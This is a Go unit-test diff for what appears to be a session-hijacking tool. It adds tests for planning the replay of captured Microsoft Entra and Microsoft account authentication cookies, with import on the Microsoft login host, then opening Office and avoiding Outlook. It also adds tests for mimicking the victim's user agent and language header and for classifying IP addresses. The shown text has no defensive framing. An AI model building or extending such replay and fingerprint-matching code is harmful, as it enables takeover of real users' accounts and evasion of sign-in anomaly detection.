@@ -173,6 +173,52 @@ func TestCookieTTL_JWT(t *testing.T) {
 	}
 }
 
+func TestUASummary(t *testing.T) {
+	got := uaSummary("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+	if !strings.Contains(got, "Chrome 131") || !strings.Contains(got, "Windows 10/11") {
+		t.Fatalf("ua=%q", got)
+	}
+	got = uaSummary("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15")
+	if !strings.Contains(got, "Safari") || !strings.Contains(got, "macOS") {
+		t.Fatalf("safari ua=%q", got)
+	}
+}
+
+func TestReplayPlan(t *testing.T) {
+	entra := sess(map[string]map[string]*CookieToken{
+		"login.microsoftonline.com": {"ESTSAUTHPERSISTENT": tok("1.AX0AMe_N-B6jSkuT5F-long")},
+	}, "")
+	p := entra.replayPlan()
+	if p.ImportOn != "https://login.microsoftonline.com" || p.ThenOpen != "https://www.office.com" {
+		t.Fatalf("entra plan: %+v", p)
+	}
+	msa := sess(map[string]map[string]*CookieToken{
+		"login.live.com": {"__Host-MSAAUTHP": tok("11-M.C543_BL2.0.U.Ms-long")},
+	}, "")
+	p = msa.replayPlan()
+	if p.ImportOn != "https://login.live.com" || !strings.Contains(p.Avoid, "outlook.live.com") {
+		t.Fatalf("msa plan: %+v", p)
+	}
+}
+
+func TestCleanIPAndPrivate(t *testing.T) {
+	if g := cleanIP("8.8.8.8:443"); g != "8.8.8.8" {
+		t.Fatalf("clean=%q", g)
+	}
+	if !isPrivateIP("10.0.0.5") || !isPrivateIP("127.0.0.1") || isPrivateIP("8.8.8.8") {
+		t.Fatal("private IP checks")
+	}
+}
+
+func TestSuggestAcceptLang(t *testing.T) {
+	if suggestAcceptLang("ES") != "es-ES,es;q=0.9,en;q=0.8" {
+		t.Fatal(suggestAcceptLang("ES"))
+	}
+	if suggestAcceptLang("") != "" {
+		t.Fatal("empty")
+	}
+}
+
 func TestExportSortedByDomainThenName(t *testing.T) {
 	s := sess(map[string]map[string]*CookieToken{
 		"b.example": {"z": tok("1"), "a": tok("1")},
